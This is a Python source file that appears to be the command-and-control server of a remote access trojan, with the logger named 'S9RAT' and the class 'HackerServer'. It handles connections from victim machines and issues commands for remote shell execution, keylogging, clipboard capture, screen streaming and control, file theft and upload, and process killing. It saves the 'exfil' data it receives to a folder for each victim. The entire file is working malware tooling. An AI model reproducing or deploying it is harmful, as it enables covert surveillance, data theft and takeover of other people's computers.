
import socket
import threading
import time
import logging
import os
from .protocol import pack_message, recv_message, recv_exact, recv_raw, DEFAULT_PORT, set_nodelay

logger = logging.getLogger("S9RAT")


class HackerServer:

    def __init__(self, port: int = DEFAULT_PORT, password: str = "",
                 output_dir: str = "rat_output"):
        self.port = port
        self.password = password
        self.output_dir = output_dir
        self._server_sock: socket.socket | None = None
        self._running = False
        self._clients: dict[str, dict] = {}
        self._lock = threading.Lock()
        self._on_client_connect = None
        self._on_client_disconnect = None
        self._on_screen_frame = None
        self._on_exfil_data = None
        self._on_shell_output = None
        self._on_process_data = None
        self._on_keylog_data = None
        self._on_clipboard_data = None
        self._on_chat_display = None
        self._on_file_browse = None
        self._on_file_download_data = None
        self._on_file_transfer_end = None
        os.makedirs(output_dir, exist_ok=True)

    def set_callbacks(self, on_connect=None, on_disconnect=None,
                      on_screen_frame=None, on_exfil_data=None,
                      on_shell_output=None, on_process_data=None,
                      on_keylog_data=None, on_clipboard_data=None,
                      on_chat_display=None, on_file_browse=None,
                      on_file_download_data=None, on_file_transfer_end=None):
        self._on_client_connect = on_connect
        self._on_client_disconnect = on_disconnect
        self._on_screen_frame = on_screen_frame
        self._on_exfil_data = on_exfil_data
        self._on_shell_output = on_shell_output
        self._on_process_data = on_process_data
        self._on_keylog_data = on_keylog_data
        self._on_clipboard_data = on_clipboard_data
        self._on_chat_display = on_chat_display
        self._on_file_browse = on_file_browse
        self._on_file_download_data = on_file_download_data
        self._on_file_transfer_end = on_file_transfer_end

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", self.port))
        self._server_sock.listen(5)
        self._server_sock.settimeout(1.0)
        self._running = True
        logger.info(f"Server listening on port {self.port}")
        threading.Thread(target=self._accept_loop, daemon=True).start()
        threading.Thread(target=self._heartbeat_loop, daemon=True).start()

    def _heartbeat_loop(self):
        while self._running:
            time.sleep(30)
            if not self._running:
                break
            with self._lock:
                for client_id, info in list(self._clients.items()):
                    try:
                        info["sock"].sendall(pack_message("HEARTBEAT", {}))
                    except Exception:
                        pass

    def stop(self):
        self._running = False
        with self._lock:
            for client_id, info in list(self._clients.items()):
                try:
                    info["sock"].close()
                except Exception:
                    pass
            self._clients.clear()
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                client_sock, addr = self._server_sock.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(client_sock, addr),
                    daemon=True,
                ).start()
            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.error(f"Accept error: {e}")

    def _handle_client(self, sock: socket.socket, addr: tuple):
        client_id = f"{addr[0]}:{addr[1]}"
        logger.info(f"New connection from {client_id}")

        try:
            sock.settimeout(30)
            set_nodelay(sock)
            msg_type, auth_data = recv_message(sock)
            if msg_type != "AUTH":
                sock.close()
                return

            if self.password and auth_data.get("password") != self.password:
                sock.sendall(pack_message("AUTH_FAIL", {}))
                sock.close()
                return

            sock.sendall(pack_message("AUTH_OK", {}))

            info = {
                "sock": sock,
                "addr": addr,
                "hostname": auth_data.get("hostname", "unknown"),
                "username": auth_data.get("username", "unknown"),
                "os": auth_data.get("os", "unknown"),
                "os_version": auth_data.get("os_version", ""),
                "arch": auth_data.get("arch", ""),
                "pid": auth_data.get("pid", 0),
                "protocol_version": auth_data.get("protocol_version", 1),
                "monitors": auth_data.get("monitors", []),
                "connected_at": time.time(),
                "screen_active": False,
                "control_enabled": False,
                "selected_monitor": 0,
                "last_heartbeat": time.time(),
            }

            with self._lock:
                self._clients[client_id] = info

            if self._on_client_connect:
                self._on_client_connect(client_id, info)

            self._client_loop(sock, client_id, info)

        except Exception as e:
            logger.error(f"Client {client_id} error: {e}")
        finally:
            with self._lock:
                self._clients.pop(client_id, None)
            if self._on_client_disconnect:
                self._on_client_disconnect(client_id)
            try:
                sock.close()
            except Exception:
                pass
            logger.info(f"Client {client_id} disconnected")

    def _client_loop(self, sock: socket.socket, client_id: str, info: dict):
        while self._running and client_id in self._clients:
            try:
                sock.settimeout(1.0)
                msg_type, data = recv_message(sock)

                if msg_type == "SCREEN_FRAME":
                    frame_size = data.get("size", 0)
                    if frame_size > 0:
                        try:
                            frame_data = recv_raw(sock, frame_size)
                        except ConnectionError:
                            break
                        if self._on_screen_frame:
                            self._on_screen_frame(client_id, frame_data)

                elif msg_type == "EXFIL_DATA":
                    exfil_type = data.get("type", "unknown")
                    exfil_data = data.get("data", {})
                    self._save_exfil(client_id, exfil_type, exfil_data)
                    if self._on_exfil_data:
                        self._on_exfil_data(client_id, exfil_type, exfil_data)

                elif msg_type == "HEARTBEAT_ACK":
                    with self._lock:
                        if client_id in self._clients:
                            self._clients[client_id]["last_heartbeat"] = time.time()

                elif msg_type == "SHELL_OUTPUT":
                    if self._on_shell_output:
                        self._on_shell_output(client_id, data)

                elif msg_type == "PROCESS_DATA":
                    if self._on_process_data:
                        self._on_process_data(client_id, data)

                elif msg_type == "KEYLOG_DATA":
                    if self._on_keylog_data:
                        self._on_keylog_data(client_id, data)

                elif msg_type == "CLIPBOARD_DATA":
                    if self._on_clipboard_data:
                        self._on_clipboard_data(client_id, data)

                elif msg_type == "CHAT_DISPLAY":
                    if self._on_chat_display:
                        self._on_chat_display(client_id, data)

                elif msg_type == "FILE_DOWNLOAD_DATA":
                    dl_size = data.get("size", 0)
                    if dl_size > 0:
                        try:
                            dl_data = recv_raw(sock, dl_size)
                        except ConnectionError:
                            break
                        if self._on_file_download_data:
                            self._on_file_download_data(client_id, data, dl_data)

                elif msg_type == "FILE_TRANSFER_DATA":
                    pass

                elif msg_type == "FILE_TRANSFER_END":
                    if self._on_file_transfer_end:
                        self._on_file_transfer_end(client_id, data)

            except socket.timeout:
                continue
            except ConnectionError:
                break
            except Exception as e:
                logger.error(f"Client {client_id} loop error: {e}")
                break

    def send_command(self, client_id: str, msg_type: str, data: dict) -> bool:
        with self._lock:
            info: dict | None = self._clients.get(client_id)
        if not info:
            return False
        try:
            info["sock"].sendall(pack_message(msg_type, data))
            return True
        except Exception as e:
            logger.error(f"Send error to {client_id}: {e}")
            return False

    def start_screen(self, client_id: str) -> bool:
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["screen_active"] = True
        return self.send_command(client_id, "SCREEN_START", {})

    def stop_screen(self, client_id: str) -> bool:
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["screen_active"] = False
        return self.send_command(client_id, "SCREEN_STOP", {})

    def select_monitor(self, client_id: str, monitor_index: int) -> bool:
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["selected_monitor"] = monitor_index
        return self.send_command(client_id, "SCREEN_SELECT", {"monitor_index": monitor_index})

    def enable_control(self, client_id: str) -> bool:
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["control_enabled"] = True
        return self.send_command(client_id, "CONTROL_ENABLE", {})

    def disable_control(self, client_id: str) -> bool:
        with self._lock:
            if client_id in self._clients:
                self._clients[client_id]["control_enabled"] = False
        return self.send_command(client_id, "CONTROL_DISABLE", {})

    def send_input(self, client_id: str, input_type: str, **kwargs) -> bool:
        data = {"input_type": input_type, **kwargs}
        return self.send_command(client_id, "CONTROL_INPUT", data)

    def request_exfil(self, client_id: str, exfil_type: str) -> bool:
        return self.send_command(client_id, "EXFIL_REQUEST", {"type": exfil_type})

    def shutdown_client(self, client_id: str) -> bool:
        return self.send_command(client_id, "SHUTDOWN", {})

    def restart_client(self, client_id: str) -> bool:
        return self.send_command(client_id, "RESTART", {})

    def logoff_client(self, client_id: str) -> bool:
        return self.send_command(client_id, "LOGOFF", {})

    def exec_shell(self, client_id: str, command: str) -> bool:
        return self.send_command(client_id, "SHELL_EXEC", {"command": command})

    def request_processes(self, client_id: str) -> bool:
        return self.send_command(client_id, "PROCESS_LIST", {})

    def kill_process(self, client_id: str, pid: int) -> bool:
        return self.send_command(client_id, "PROCESS_KILL", {"pid": pid})

    def start_keylog(self, client_id: str) -> bool:
        return self.send_command(client_id, "KEYLOG_START", {})

    def stop_keylog(self, client_id: str) -> bool:
        return self.send_command(client_id, "KEYLOG_STOP", {})

    def get_clipboard(self, client_id: str) -> bool:
        return self.send_command(client_id, "CLIPBOARD_GET", {})

    def send_chat(self, client_id: str, message: str) -> bool:
        return self.send_command(client_id, "CHAT_SEND", {"message": message})

    def take_screenshot(self, client_id: str) -> bool:
        return self.send_command(client_id, "SCREENSHOT", {})

    def browse_directory(self, client_id: str, path: str) -> bool:
        return self.send_command(client_id, "FILE_BROWSE", {"path": path})

    def download_file(self, client_id: str, remote_path: str) -> bool:
        return self.send_command(client_id, "FILE_DOWNLOAD", {"path": remote_path})

    def upload_file(self, client_id: str, local_path: str, dest_path: str) -> bool:
        import threading as _threading
        def _do_upload():
            try:
                info = self._clients.get(client_id)
                if not info:
                    return
                sock = info["sock"]
                filename = os.path.basename(local_path)
                size = os.path.getsize(local_path)
                sock.sendall(pack_message("FILE_TRANSFER", {
                    "filename": filename, "size": size, "dest_path": dest_path,
                }))
                with open(local_path, "rb") as f:
                    while True:
                        chunk = f.read(65536)
                        if not chunk:
                            break
                        sock.sendall(chunk)
                logger.info(f"File uploaded: {local_path} -> {client_id}:{dest_path}")
            except Exception as e:
                logger.error(f"Upload error: {e}")
        _threading.Thread(target=_do_upload, daemon=True).start()
        return True

    def _save_exfil(self, client_id: str, exfil_type: str, data: dict):
        client_dir = os.path.join(self.output_dir, client_id.replace(":", "_"))
        os.makedirs(client_dir, exist_ok=True)
        filepath = os.path.join(client_dir, f"{exfil_type}.txt")
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                if isinstance(data, dict):
                    for key, value in data.items():
                        f.write(f"{key}: {value}\n")
                else:
                    f.write(str(data))
            logger.info(f"Exfil saved: {filepath}")
        except Exception as e:
            logger.error(f"Failed to save exfil: {e}")

    def get_clients(self) -> dict:
        with self._lock:
            return {k: {kk: vv for kk, vv in v.items() if kk != "sock"}
                    for k, v in self._clients.items()}
